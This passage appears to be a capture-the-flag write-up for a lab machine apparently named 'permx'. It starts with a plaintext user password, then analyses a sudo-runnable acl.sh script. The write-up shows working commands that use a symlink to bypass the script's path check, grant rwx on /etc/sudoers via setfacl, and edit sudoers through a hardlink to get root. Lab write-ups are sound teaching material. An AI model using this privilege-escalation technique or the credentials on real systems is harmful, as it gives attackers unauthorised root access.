user: mtz
password: 03F6lY3uXAP2bkW8  

### /OPT 

Upon looking here we can find the following file called acl.sh:

```bash
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

There are some things we have to consider with this:
- The /home/mtz restriction can be bypassed though a softlink (we can go anywhere)
- the double quotes eliminate the possibility of giving random commands here and force us to only give files to setfacl. 
- Some folders are non writable, and we will not be able to write to them no matter the permissions of the file. To read we do not have many problems.

So probably our options are:
- Read critical information which we can use to elevate our privileges 
- Find which folders are writable which contain any binary we can use to elevate our privileges 
- Find other misconfigurations we can use


Finally, if found a way to bypass the directory check by using hardlinks.
# LINKS

By simply typing the following commands i was able to edit the sudoers file and grant myself permissions to become root.

```bash
mtz@permx:/tmp$ ln -s / /home/mtz/all
mtz@permx:/tmp$ sudo /opt/acl.sh mtz rwx /home/mtz/all/etc/sudoers
mtz@permx:/tmp$ ln /etc/sudoers ./sudoers
mtz@permx:/tmp$ nano sudoers 
mtz@permx:/tmp$ sudo su
```

- The first command gets rid of the "only /home/mtz" restriction by creating a softlink to the "root" directory.
- The second one enables us to do anyting on /etc/sudoers
- The third one creates a hardlink of sudoers (to bypass the non modifiable problem) 
- The last elevates us to [[root]]
